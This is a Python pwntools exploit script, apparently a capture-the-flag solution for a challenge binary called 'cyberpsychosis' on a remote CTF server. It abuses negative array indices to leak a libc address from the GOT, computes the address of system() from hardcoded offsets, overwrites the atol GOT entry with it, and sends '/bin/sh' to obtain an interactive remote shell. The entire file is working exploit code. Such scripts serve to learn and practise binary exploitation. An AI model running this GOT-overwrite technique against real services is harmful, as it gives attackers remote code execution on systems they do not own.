from pwn import *

context.arch = "amd64"
elf=context.binary=ELF('pwn/cyberpsychosis/cyberpsychosis')

#r = process('pwn/cyberpsychosis/cyberpsychosis')
r = remote('ctf.adl.tw', 10004)

print("got.atol addrs is :%#x"%elf.got.atol)          #atol is at     0x405068
print("implants addrs is :%#x"%elf.symbols.implants)  #implants is at 0x4050e0
#elf.got.atol=elf.symbols.implants-0x78
output=r.recvuntil(b'.')#stuff from banner

#first populate the got table
r.sendline(b'2')#implant stuff
sleep(0.1)
r.sendline(b'0')# at index 0
sleep(0.1)
r.sendline(b'123456789')#implant name 
sleep(0.1)
r.sendline(b'999999999')#implant value
output=r.recvuntil(b'!')#
print(output)

#we then leak the libc base with show info
r.sendline(b'1')#implant
sleep(0.1)
output=r.recvuntil(b'idx> ')
r.sendline(b'-3')# at 0
sleep(0.1)
output=r.recvuntil(b'value: ')
output=r.recvuntil(b'\n')
#offset of printf@GLIBC_2.2.5 is 0x61c90 from libc base,
# found with gdb info proc map and got
output=int(output[:-1])
print("address of printf@glibc :%#x"%output) 
print("address of libc base is :%#x"%(output-0x61c90)) 
libc_base=output-0x61c90
sleep(0.1)

pause()




#the 3rd payload overwrites the got table, and gets us the shell
r.sendline(b'2')#implant
r.sendline(b'-2')#this writes to the elf.got.atol

sys_addr=libc_base+0x52290

print('system addr:%#x'%sys_addr)
payload=flat([
    b'a'*8,
    sys_addr])
r.sendline(payload)
pause()
payload=flat([b'/bin/sh\0'])
r.sendline(payload)

r.interactive()

